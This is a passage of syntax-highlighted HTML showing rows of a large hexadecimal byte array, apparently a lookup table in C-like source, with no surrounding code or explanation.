class="number">0xd1</span>, <span class="number">0x06</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5c</span>, <span class="number">0x76</span>, <span class="number">0xa4</span>, <span class="number">0x23</span>, <span class="number">0x7f</span>, <span class="number">0x65</span>, <span class="number">0xff</span>, <span class="number">0x05</span>, <span class="number">0x60</span>, <span class="number">0x0f</span>, <span class="number">0xf0</span>, <span class="number">0x85</span>, <span class="number">0x47</span>, <span class="number">0xe7</span>, <span class="number">0x5f</span>, <span class="number">0x18</span>, <span class="number">0x93</span>, <span class="number">0x61</span>, <span class="number">0xd3</span>, <span class="number">0x38</span>, <span class="number">0xde</span>, <span class="number">0x09</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5d</span>, <span class="number">0x77</span>, <span class="number">0xa5</span>, <span class="number">0x22</span>, <span class="number">0x7e</span>, <span class="number">0x64</span>, <span class="number">0xfe</span>, <span class="number">0x04</span>, <span class="number">0x61</span>, <span class="number">0x0e</span>, <span class="number">0xf1</span>, <span class="number">0x84</span>, <span class="number">0x46</span>, <span class="number">0xe6</span>, <span class="number">0x5e</span>, <span class="number">0x19</span>, <span class="number">0x92</span>, <span class="number">0x60</span>, <span class="number">0xd2</span>, <span class="number">0x39</span>, <span class="number">0xdf</span>, <span class="number">0x08</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5e</span>, <span class="number">0x74</span>, <span class="number">0xa6</span>, <span class="number">0x21</span>, <span class="number">0x7d</span>, <span class="number">0x67</span>, <span class="number">0xfd</span>, <span class="number">0x07</span>, <span class="number">0x62</span>, <span class="number">0x0d</span>, <span class="number">0xf2</span>, <span class="number">0x87</span>, <span class="number">0x45</span>, <span class="number">0xe5</span>, <span class="number">0x5d</span>, <span class="number">0x1a</span>, <span class="number">0x91</span>, <span class="number">0x63</span>, <span class="number">0xd1</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x0b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5f</span>, <span class="number">0x75</span>, <span class="number">0xa7</span>, <span class="number">0x20</span>, <span class="number">0x7c</span>, <span class="number">0x66</span>, <span class="number">0xfc</span>, <span class="number">0x06</span>, <span class="number">0x63</span>, <span class="number">0x0c</span>, <span class="number">0xf3</span>, <span class="number">0x86</span>, <span class="number">0x44</span>, <span class="number">0xe4</span>, <span class="number">0x5c</span>, <span class="number">0x1b</span>, <span class="number">0x90</span>, <span class="number">0x62</span>, <span class="number">0xd0</span>, <span class="number">0x3b</span>, <span class="number">0xdd</span>, <span class="number">0x0a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x58</span>, <span class="number">0x72</span>, <span class="number">0xa0</span>, <span class="number">0x27</span>, <span class="number">0x7b</span>, <span class="number">0x61</span>, <span class="number">0xfb</span>, <span class="number">0x01</span>, <span class="number">0x64</span>, <span class="number">0x0b</span>, <span class="number">0xf4</span>, <span class="number">0x81</span>, <span class="number">0x43</span>, <span class="number">0xe3</span>, <span class="number">0x5b</span>, <span class="number">0x1c</span>, <span class="number">0x97</span>, <span class="number">0x65</span>, <span class="number">0xd7</span>, <span class="number">0x3c</span>, <span class="number">0xda</span>, <span class="number">0x0d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x59</span>, <span class="number">0x73</span>, <span class="number">0xa1</span>, <span class="number">0x26</span>, <span class="number">0x7a</span>, <span class="number">0x60</span>, <span class="number">0xfa</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x0a</span>, <span class="number">0xf5</span>, <span class="number">0x80</span>, <span class="number">0x42</span>, <span class="number">0xe2</span>, <span class="number">0x5a</span>, <span class="number">0x1d</span>, <span class="number">0x96</span>, <span class="number">0x64</span>, <span class="number">0xd6</span>, <span class="number">0x3d</span>, <span class="number">0xdb</span>, <span class="number">0x0c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5a</span>, <span class="number">0x70</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x79</span>, <span class="number">0x63</span>, <span class="number">0xf9</span>, <span class="number">0x03</span>, <span class="number">0x66</span>, <span class="number">0x09</span>, <span class="number">0xf6</span>, <span class="number">0x83</span>, <span class="number">0x41</span>, <span class="number">0xe1</span>, <span class="number">0x59</span>, <span class="number">0x1e</span>, <span class="number">0x95</span>, <span class="number">0x67</span>, <span class="number">0xd5</span>, <span class="number">0x3e</span>, <span class="number">0xd8</span>, <span class="number">0x0f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5b</span>, <span class="number">0x71</span>, <span class="number">0xa3</span>, <span class="number">0x24</span>, <span class="number">0x78</span>, <span class="number">0x62</span>, <span class="number">0xf8</span>, <span class="number">0x02</span>, <span class="number">0x67</span>, <span class="number">0x08</span>, <span class="number">0xf7</span>, <span class="number">0x82</span>, <span class="number">0x40</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x1f</span>, <span class="number">0x94</span>, <span class="number">0x66</span>, <span class="number">0xd4</span>, <span class="number">0x3f</span>, <span class="number">0xd9</span>, <span class="number">0x0e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x64</span>, <span class="number">0x4e</span>, <span class="number">0x9c</span>, <span class="number">0x1b</span>, <span class="number">0x47</span>, <span class="number">0x5d</span>, <span class="number">0xc7</span>, <span class="number">0x3d</span>, <span class="number">0x58</span>, <span class="number">0x37</span>, <span class="number">0xc8</span>, <span class="number">0xbd</span>, <span class="number">0x7f</span>, <span class="number">0xdf</span>, <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0xab</span>, <span class="number">0x59</span>, <span class="number">0xeb</span>, <span class="number">0x00</span>, <span class="number">0xe6</span>, <span class="number">0x31</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x65</span>, <span class="number">0x4f</span>, <span class="number">0x9d</span>, <span class="number">0x1a</span>, <span class="number">0x46</span>, <span class="number">0x5c</span>, <span class="number">0xc6</span>, <span class="number">0x3c</span>, <span class="number">0x59</span>, <span class="number">0x36</span>, <span class="number">0xc9</span>, <span class="number">0xbc</span>, <span class="number">0x7e</span>, <span class="number">0xde</span>, <span class="number">0x66</span>, <span class="number">0x21</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0xea</span>, <span class="number">0x01</span>, <span class="number">0xe7</span>, <span class="number">0x30</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x66</span>, <span class="number">0x4c</span>, <span class="number">0x9e</span>, <span class="number">0x19</span>, <span class="number">0x45</span>, <span class="number">0x5f</span>, <span class="number">0xc5</span>, <span class="number">0x3f</span>, <span class="number">0x5a</span>, <span class="number">0x35</span>, <span class="number">0xca</span>, <span class="number">0xbf</span>, <span class="number">0x7d</span>, <span class="number">0xdd</span>, <span class="number">0x65</span>, <span class="number">0x22</span>, <span class="number">0xa9</span>, <span class="number">0x5b</span>, <span class="number">0xe9</span>, <span class="number">0x02</span>, <span class="number">0xe4</span>, <span class="number">0x33</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x67</span>, <span class="number">0x4d</span>, <span class="number">0x9f</span>, <span class="number">0x18</span>, <span class="number">0x44</span>, <span class="number">0x5e</span>, <span class="number">0xc4</span>, <span class="number">0x3e</span>, <span class="number">0x5b</span>, <span class="number">0x34</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x7c</span>, <span class="number">0xdc</span>, <span class="number">0x64</span>, <span class="number">0x23</span>, <span class="number">0xa8</span>, <span class="number">0x5a</span>, <span class="number">0xe8</span>, <span class="number">0x03</span>, <span class="number">0xe5</span>, <span class="number">0x32</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x60</span>, <span class="number">0x4a</span>, <span class="number">0x98</span>, <span class="number">0x1f</span>, <span class="number">0x43</span>, <span class="number">0x59</span>, <span class="number">0xc3</span>, <span class="number">0x39</span>, <span class="number">0x5c</span>, <span class="number">0x33</span>, <span class="number">0xcc</span>, <span class="number">0xb9</span>, <span class="number">0x7b</span>, <span class="number">0xdb</span>, <span class="number">0x63</span>, <span class="number">0x24</span>, <span class="number">0xaf</span>, <span class="number">0x5d</span>, <span class="number">0xef</span>, <span class="number">0x04</span>, <span class="number">0xe2</span>, <span class="number">0x35</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x61</span>, <span class="number">0x4b</span>, <span class="number">0x99</span>, <span class="number">0x1e</span>, <span class="number">0x42</span>, <span class="number">0x58</span>, <span class="number">0xc2</span>, <span class="number">0x38</span>, <span class="number">0x5d</span>, <span class="number">0x32</span>, <span class="number">0xcd</span>, <span class="number">0xb8</span>, <span class="number">0x7a</span>, <span class="number">0xda</span>, <span class="number">0x62</span>, <span class="number">0x25</span>, <span class="number">0xae</span>, <span class="number">0x5c</span>, <span class="number">0xee</span>, <span class="number">0x05</span>, <span class="number">0xe3</span>, <span class="number">0x34</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x62</span>, <span class="number">0x48</span>, <span class="number">0x9a</span>, <span class="number">0x1d</span>, <span class="number">0x41</span>, <span class="number">0x5b</span>, <span class="number">0xc1</span>, <span class="number">0x3b</span>, <span class="number">0x5e</span>, <span class="number">0x31</span>, <span class="number">0xce</span>, <span class="number">0xbb</span>, <span class="number">0x79</span>, <span class="number">0xd9</span>, <span class="number">0x61</span>, <span class="number">0x26</span>, <span class="number">0xad</span>, <span class="number">0x5f</span>, <span class="number">0xed</span>, <span class="number">0x06</span>, <span class="number">0xe0</span>, <span class="number">0x37</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x63</span>, <span class="number">0x49</span>, <span class="number">0x9b</span>, <span class="number">0x1c</span>, <span class="number">0x40</span>, <span class="number">0x5a</span>, <span class="number">0xc0</span>, <span class="number">0x3a</span>, <span class="number">0x5f</span>, <span class="number">0x30</span>, <span class="number">0xcf</span>, <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0xd8</span>, <span class="number">0x60</span>, <span class="number">0x27</span>, <span class="number">0xac</span>, <span class="number">0x5e</span>, <span class="number">0xec</span>, <span class="number">0x07</span>, <span class="number">0xe1</span>, <span class="number">0x36</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6c</span>, <span class="number">0x46</span>, <span class="number">0x94</span>, <span class="number">0x13</span>, <span class="number">0x4f</span>, <span class="number">0x55</span>, <span class="number">0xcf</span>, <span class="number">0x35</span>, <span class="number">0x50</span>, <span class="number">0x3f</span>, <span class="number">0xc0</span>, <span class="number">0xb5</span>, <span class="number">0x77</span>, <span class="number">0xd7</span>, <span class="number">0x6f</span>, <span class="number">0x28</span>, <span class="number">0xa3</span>, <span class="number">0x51</span>, <span class="number">0xe3</span>, <span class="number">0x08</span>, <span class="number">0xee</span>, <span class="number">0x39</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6d</span>, <span class="number">0x47</span>, <span class="number">0x95</span>, <span class="number">0x12</span>, <span class="number">0x4e</span>, <span class="number">0x54</span>, <span class="number">0xce</span>, <span class="number">0x34</span>, <span class="number">0x51</span>, <span class="number">0x3e</span>, <span class="number">0xc1</span>, <span class="number">0xb4</span>, <span class="number">0x76</span>, <span class="number">0xd6</span>, <span class="number">0x6e</span>, <span class="number">0x29</span>, <span class="number">0xa2</span>, <span class="number">0x50</span>, <span class="number">0xe2</span>, <span class="number">0x09</span>, <span class="number">0xef</span>, <span class="number">0x38</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6e</span>, <span class="number">0x44</span>, <span class="number">0x96</span>, <span class="number">0x11</span>, <span class="number">0x4d</span>, <span class="number">0x57</span>, <span class="number">0xcd</span>, <span class="number">0x37</span>, <span class="number">0x52</span>, <span class="number">0x3d</span>, <span class="number">0xc2</span>, <span class="number">0xb7</span>, <span class="number">0x75</span>, <span class="number">0xd5</span>, <span class="number">0x6d</span>, <span class="number">0x2a</span>, <span class="number">0xa1</span>, <span class="number">0x53</span>, <span class="number">0xe1</span>, <span class="number">0x0a</span>, <span class="number">0xec</span>, <span class="number">0x3b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6f</span>, <span class="number">0x45</span>, <span class="number">0x97</span>, <span class="number">0x10</span>, <span class="number">0x4c</span>, <span class="number">0x56</span>, <span class="number">0xcc</span>, <span class="number">0x36</span>, <span class="number">0x53</span>, <span class="number">0x3c</span>, <span class="number">0xc3</span>, <span class="number">0xb6</span>, <span class="number">0x74</span>, <span class="number">0xd4</span>, <span class="number">0x6c</span>, <span class="number">0x2b</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0xe0</span>, <span class="number">0x0b</span>, <span class="number">0xed</span>, <span class="number">0x3a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x68</span>, <span class="number">0x42</span>, <span class="number">0x90</span>, <span class="number">0x17</span>, <span class="number">0x4b</span>, <span class="number">0x51</span>, <span class="number">0xcb</span>, <span class="number">0x31</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0xc4</span>, <span class="number">0xb1</span>, <span class="number">0x73</span>, <span class="number">0xd3</span>, <span class="number">0x6b</span>, <span class="number">0x2c</span>, <span class="number">0xa7</span>, <span class="number">0x55</span>, <span class="number">0xe7</span>, <span class="number">0x0c</span>, <span class="number">0xea</span>, <span class="number">0x3d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x69</span>, <span class="number">0x43</span>, <span class="number">0x91</span>, <span class="number">0x16</span>, <span class="number">0x4a</span>, <span class="number">0x50</span>, <span class="number">0xca</span>, <span class="number">0x30</span>, <span class="number">0x55</span>, <span class="number">0x3a</span>, <span class="number">0xc5</span>, <span class="number">0xb0</span>, <span class="number">0x72</span>, <span class="number">0xd2</span>, <span class="number">0x6a</span>, <span class="number">0x2d</span>, <span class="number">0xa6</span>, <span class="number">0x54</span>, <span class="number">0xe6</span>, <span class="number">0x0d</span>, <span class="number">0xeb</span>, <span class="number">0x3c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x92</span>, <span class="number">0x15</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0xc9</span>, <span class="number">0x33</span>, <span class="number">0x56</span>, <span class="number">0x39</span>, <span class="number">0xc6</span>, <span class="number">0xb3</span>, <span class="number">0x71</span>, <span class="number">0xd1</span>, <span class="number">0x69</span>, <span class="number">0x2e</span>, <span class="number">0xa5</span>, <span class="number">0x57</span>, <span class="number">0xe5</span>, <span class="number">0x0e</span>, <span class="number">0xe8</span>, <span class="number">0x3f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6b</span>, <span class="number">0x41</span>, <span class="number">0x93</span>, <span class="number">0x14</span>, <span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0xc8</span>, <span class="number">0x32</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0xc7</span>, <span class="number">0xb2</span>, <span class="number">0x70</span>, <span class="number">0xd0</span>, <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0xa4</span>, <span class="number">0x56</span>, <span class="number">0xe4</span>, <span class="number">0x0f</span>, <span class="number">0xe9</span>, <span class="number">0x3e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x74</span>, <span class="number">0x5e</span>, <span class="number">0x8c</span>, <span class="number">0x0b</span>, <span class="number">0x57</span>, <span class="number">0x4d</span>, <span class="number">0xd7</span>, <span class="number">0x2d</span>, <span class="number">0x48</span>, <span class="number">0x27</span>, <span class="number">0xd8</span>, <span class="number">0xad</span>, <span class="number">0x6f</span>, <span class="number">0xcf</span>, <span class="number">0x77</span>, <span class="number">0x30</span>, <span class="number">0xbb</span>, <span class="number">0x49</span>, <span class="number">0xfb</span>, <span class="number">0x10</span>, <span class="number">0xf6</span>, <span class="number">0x21</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x75</span>, <span class="number">0x5f</span>, <span class="number">0x8d</span>, <span class="number">0x0a</span>, <span class="number">0x56</span>, <span class="number">0x4c</span>, <span class="number">0xd6</span>, <span class="number">0x2c</span>, <span class="number">0x49</span>, <span class="number">0x26</span>, <span class="number">0xd9</span>, <span class="number">0xac</span>, <span class="number">0x6e</span>, <span class="number">0xce</span>, <span class="number">0x76</span>, <span class="number">0x31</span>, <span class="number">0xba</span>, <span class="number">0x48</span>, <span class="number">0xfa</span>, <span class="number">0x11</span>, <span class="number">0xf7</span>, <span class="number">0x20</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x76</span>, <span class="number">0x5c</span>, <span class="number">0x8e</span>, <span class="number">0x09</span>, <span class="number">0x55</span>, <span class="number">0x4f</span>, <span class="number">0xd5</span>, <span class="number">0x2f</span>, <span class="number">0x4a</span>, <span class="number">0x25</span>, <span class="number">0xda</span>, <span class="number">0xaf</span>, <span class="number">0x6d</span>, <span class="number">0xcd</span>, <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0xb9</span>, <span class="number">0x4b</span>, <span class="number">0xf9</span>, <span class="number">0x12</span>, <span class="number">0xf4</span>, <span class="number">0x23</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x77</span>, <span class="number">0x5d</span>, <span class="number">0x8f</span>, <span class="number">0x08</span>, <span class="number">0x54</span>, <span class="number">0x4e</span>, <span class="number">0xd4</span>, <span class="number">0x2e</span>, <span class="number">0x4b</span>, <span class="number">0x24</span>, <span class="number">0xdb</span>, <span class="number">0xae</span>, <span class="number">0x6c</span>, <span class="number">0xcc</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xb8</span>, <span class="number">0x4a</span>, <span class="number">0xf8</span>, <span class="number">0x13</span>, <span class="number">0xf5</span>, <span class="number">0x22</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x70</span>, <span class="number">0x5a</span>, <span class="number">0x88</span>, <span class="number">0x0f</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0xd3</span>, <span class="number">0x29</span>, <span class="number">0x4c</span>, <span class="number">0x23</span>, <span class="number">0xdc</span>, <span class="number">0xa9</span>, <span class="number">0x6b</span>, <span class="number">0xcb</span>, <span class="number">0x73</span>, <span class="number">0x34</span>, <span class="number">0xbf</span>, <span class="number">0x4d</span>, <span class="number">0xff</span>, <span class="number">0x14</span>, <span class="number">0xf2</span>, <span class="number">0x25</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x71</span>, <span class="number">0x5b</span>, <span class="number">0x89</span>, <span class="number">0x0e</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0xd2</span>, <span class="number">0x28</span>, <span class="number">0x4d</span>, <span class="number">0x22</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x6a</span>, <span class="number">0xca</span>, <span class="number">0x72</span>, <span class="number">0x35</span>, <span class="number">0xbe</span>, <span class="number">0x4c</span>, <span class="number">0xfe</span>, <span class="number">0x15</span>, <span class="number">0xf3</span>, <span class="number">0x24</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x72</span>, <span class="number">0x58</span>, <span class="number">0x8a</span>, <span class="number">0x0d</span>, <span class="number">0x51</span>, <span class="number">0x4b</span>, <span class="number">0xd1</span>, <span class="number">0x2b</span>, <span class="number">0x4e</span>, <span class="number">0x21</span>, <span class="number">0xde</span>, <span class="number">0xab</span>, <span class="number">0x69</span>, <span class="number">0xc9</span>, <span class="number">0x71</span>, <span class="number">0x36</span>, <span class="number">0xbd</span>, <span class="number">0x4f</span>, <span class="number">0xfd</span>, <span class="number">0x16</span>, <span class="number">0xf0</span>, <span class="number">0x27</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x73</span>, <span class="number">0x59</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x50</span>, <span class="number">0x4a</span>, <span class="number">0xd0</span>, <span class="number">0x2a</span>, <span class="number">0x4f</span>, <span class="number">0x20</span>, <span class="number">0xdf</span>, <span class="number">0xaa</span>, <span class="number">0x68</span>, <span class="number">0xc8</span>, <span class="number">0x70</span>, <span class="number">0x37</span>, <span class="number">0xbc</span>, <span class="number">0x4e</span>, <span class="number">0xfc</span>, <span class="number">0x17</span>, <span class="number">0xf1</span>, <span class="number">0x26</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7c</span>, <span class="number">0x56</span>, <span class="number">0x84</span>, <span class="number">0x03</span>, <span class="number">0x5f</span>, <span class="number">0x45</span>, <span class="number">0xdf</span>, <span class="number">0x25</span>, <span class="number">0x40</span>, <span class="number">0x2f</span>, <span class="number">0xd0</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0xc7</span>, <span class="number">0x7f</span>, <span class="number">0x38</span>, <span class="number">0xb3</span>, <span class="number">0x41</span>, <span class="number">0xf3</span>, <span class="number">0x18</span>, <span class="number">0xfe</span>, <span class="number">0x29</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7d</span>, <span class="number">0x57</span>, <span class="number">0x85</span>, <span class="number">0x02</span>, <span class="number">0x5e</span>, <span class="number">0x44</span>, <span class="number">0xde</span>, <span class="number">0x24</span>, <span class="number">0x41</span>, <span class="number">0x2e</span>, <span class="number">0xd1</span>, <span class="number">0xa4</span>, <span class="number">0x66</span>, <span class="number">0xc6</span>, <span class="number">0x7e</span>, <span class="number">0x39</span>, <span class="number">0xb2</span>, <span class="number">0x40</span>, <span class="number">0xf2</span>, <span class="number">0x19</span>, <span class="number">0xff</span>, <span class="number">0x28</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7e</span>, <span class="number">0x54</span>, <span class="number">0x86</span>, <span class="number">0x01</span>, <span class="number">0x5d</span>, <span class="number">0x47</span>, <span class="number">0xdd</span>, <span class="number">0x27</span>, <span class="number">0x42</span>, <span class="number">0x2d</span>, <span class="number">0xd2</span>, <span class="number">0xa7</span>, <span class="number">0x65</span>, <span class="number">0xc5</span>, <span class="number">0x7d</span>, <span class="number">0x3a</span>, <span class="number">0xb1</span>, <span class="number">0x43</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0xfc</span>, <span class="number">0x2b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7f</span>, <span class="number">0x55</span>, <span class="number">0x87</span>, <span class="number">0x00</span>, <span class="number">0x5c</span>, <span class="number">0x46</span>, <span class="number">0xdc</span>, <span class="number">0x26</span>, <span class="number">0x43</span>, <span class="number">0x2c</span>, <span class="number">0xd3</span>, <span class="number">0xa6</span>, <span class="number">0x64</span>, <span class="number">0xc4</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0xb0</span>, <span class="number">0x42</span>, <span class="number">0xf0</span>, <span class="number">0x1b</span>, <span class="number">0xfd</span>, <span class="number">0x2a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x78</span>, <span class="number">0x52</span>, <span class="number">0x80</span>, <span class="number">0x07</span>, <span class="number">0x5b</span>, <span class="number">0x41</span>, <span class="number">0xdb</span>, <span class="number">0x21</span>, <span class="number">0x44</span>, <span class="number">0x2b</span>, <span class="number">0xd4</span>, <span class="number">0xa1</span>, <span class="number">0x63</span>, <span class="number">0xc3</span>, <span class="number">0x7b</span>, <span class="number">0x3c</span>, <span class="number">0xb7</span>, <span class="number">0x45</span>, <span class="number">0xf7</span>, <span class="number">0x1c</span>, <span class="number">0xfa</span>, <span class="number">0x2d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x79</span>, <span class="number">0x53</span>, <span class="number">0x81</span>, <span class="number">0x06</span>, <span class="number">0x5a</span>, <span class="number">0x40</span>, <span class="number">0xda</span>, <span class="number">0x20</span>, <span class="number">0x45</span>, <span class="number">0x2a</span>, <span class="number">0xd5</span>, <span class="number">0xa0</span>, <span class="number">0x62</span>, <span class="number">0xc2</span>, <span class="number">0x7a</span>, <span class="number">0x3d</span>, <span class="number">0xb6</span>, <span class="number">0x44</span>, <span class="number">0xf6</span>, <span class="number">0x1d</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7a</span>, <span class="number">0x50</span>, <span class="number">0x82</span>, <span class="number">0x05</span>, <span class="number">0x59</span>, <span class="number">0x43</span>, <span class="number">0xd9</span>, <span class="number">0x23</span>, <span class="number">0x46</span>, <span class="number">0x29</span>, <span class="number">0xd6</span>, <span class="number">0xa3</span>, <span class="number">0x61</span>, <span class="number">0xc1</span>, <span class="number">0x79</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x47</span>, <span class="number">0xf5</span>, <span class="number">0x1e</span>, <span class="number">0xf8</span>, <span class="number">0x2f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7b</span>, <span class="number">0x51</span>, <span class="number">0x83</span>, <span class="number">0x04</span>, <span class="number">0x58</span>, <span class="number">0x42</span>, <span class="number">0xd8</span>, <span class="number">0x22</span>, <span class="number">0x47</span>, <span class="number">0x28</span>, <span class="number">0xd7</span>, <span class="number">0xa2</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x78</span>, <span class="number">0x3f</span>, <span class="number">0xb4</span>, <span class="number">0x46</span>, <span class="number">0xf4</span>, <span class="number">0x1f</span>, <span class="number">0xf9</span>, <span class="number">0x2e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x04</span>, <span class="number">0x2e</span>, <span class="number">0xfc</span>, <span class="number">0x7b</span>, <span class="number">0x27</span>, <span class="number">0x3d</span>, <span class="number">0xa7</span>, <span class="number">0x5d</span>, <span class="number">0x38</span>, <span class="number">0x57</span>, <span class="number">0xa8</span>, <span class="number">0xdd</span>, <span class="number">0x1f</span>, <span class="number">0xbf</span>, <span class="number">0x07</span>, <span class="number">0x40</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x8b</span>, <span class="number">0x60</span>, <span class="number">0x86</span>, <span class="number">0x51</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x05</span>, <span class="number">0x2f</span>, <span class="number">0xfd</span>, <span class="number">0x7a</span>, <span class="number">0x26</span>, <span class="number">0x3c</span>, <span class="number">0xa6</span>, <span class="number">0x5c</span>, <span class="number">0x39</span>, <span class="number">0x56</span>, <span class="number">0xa9</span>, <span class="number">0xdc</span>, <span class="number">0x1e</span>, <span class="number">0xbe</span>, <span class="number">0x06</span>, <span class="number">0x41</span>, <span class="number">0xca</span>, <span class="number">0x38</span>, <span class="number">0x8a</span>, <span class="number">0x61</span>, <span class="number">0x87</span>, <span class="number">0x50</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x06</span>, <span class="number">0x2c</span>, <span class="number">0xfe</span>, <span class="number">0x79</span>, <span class="number">0x25</span>, <span class="number">0x3f</span>, <span class="number">0xa5</span>, <span class="number">0x5f</span>, <span class="number">0x3a</span>, <span class="number">0x55</span>, <span class="number">0xaa</span>, <span class="number">0xdf</span>, <span class="number">0x1d</span>, <span class="number">0xbd</span>, <span class="number">0x05</span>, <span class="number">0x42</span>, <span class="number">0xc9</span>, <span class="number">0x3b</span>, <span class="number">0x89</span>, <span class="number">0x62</span>, <span class="number">0x84</span>, <span class="number">0x53</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x07</span>, <span class="number">0x2d</span>, <span class="number">0xff</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x3e</span>, <span class="number">0xa4</span>, <span class="number">0x5e</span>, <span class="number">0x3b</span>, <span class="number">0x54</span>, <span class="number">0xab</span>, <span class="number">0xde</span>, <span class="number">0x1c</span>, <span class="number">0xbc</span>, <span class="number">0x04</span>, <span class="number">0x43</span>, <span class="number">0xc8</span>, <span class="number">0x3a</span>, <span class="number">0x88</span>, <span class="number">0x63</span>, <span class="number">0x85</span>, <span class="number">0x52</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x00</span>, <span class="number">0x2a</span>, <span class="number">0xf8</span>, <span class="number">0x7f</span>, <span class="number">0x23</span>, <span class="number">0x39</span>, <span class="number">0xa3</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x53</span>, <span class="number">0xac</span>, <span class="number">0xd9</span>, <span class="number">0x1b</span>, <span class="number">0xbb</span>, <span class="number">0x03</span>, <span class="number">0x44</span>, <span class="number">0xcf</span>, <span class="number">0x3d</span>, <span class="number">0x8f</span>, <span class="number">0x64</span>, <span class="number">0x82</span>, <span class="number">0x55</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x01</span>, <span class="number">0x2b</span>, <span class="number">0xf9</span>, <span class="number">0x7e</span>, <span class="number">0x22</span>, <span class="number">0x38</span>, <span class="number">0xa2</span>, <span class="number">0x58</span>, <span class="number">0x3d</span>, <span class="number">0x52</span>, <span class="number">0xad</span>, <span class="number">0xd8</span>, <span class="number">0x1a</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0x45</span>, <span class="number">0xce</span>, <span class="number">0x3c</span>, <span class="number">0x8e</span>, <span class="number">0x65</span>, <span class="number">0x83</span>, <span class="number">0x54</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x02</span>, <span class="number">0x28</span>, <span class="number">0xfa</span>, <span class="number">0x7d</span>, <span class="number">0x21</span>, <span class="number">0x3b</span>, <span class="number">0xa1</span>, <span class="number">0x5b</span>, <span class="number">0x3e</span>, <span class="number">0x51</span>, <span class="number">0xae</span>, <span class="number">0xdb</span>, <span class="number">0x19</span>, <span class="number">0xb9</span>, <span class="number">0x01</span>, <span class="number">0x46</span>, <span class="number">0xcd</span>, <span class="number">0x3f</span>, <span class="number">0x8d</span>, <span class="number">0x66</span>, <span class="number">0x80</span>, <span class="number">0x57</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0xfb</span>, <span class="number">0x7c</span>, <span class="number">0x20</span>, <span class="number">0x3a</span>, <span class="number">0xa0</span>, <span class="number">0x5a</span>, <span class="number">0x3f</span>, <span class="number">0x50</span>, 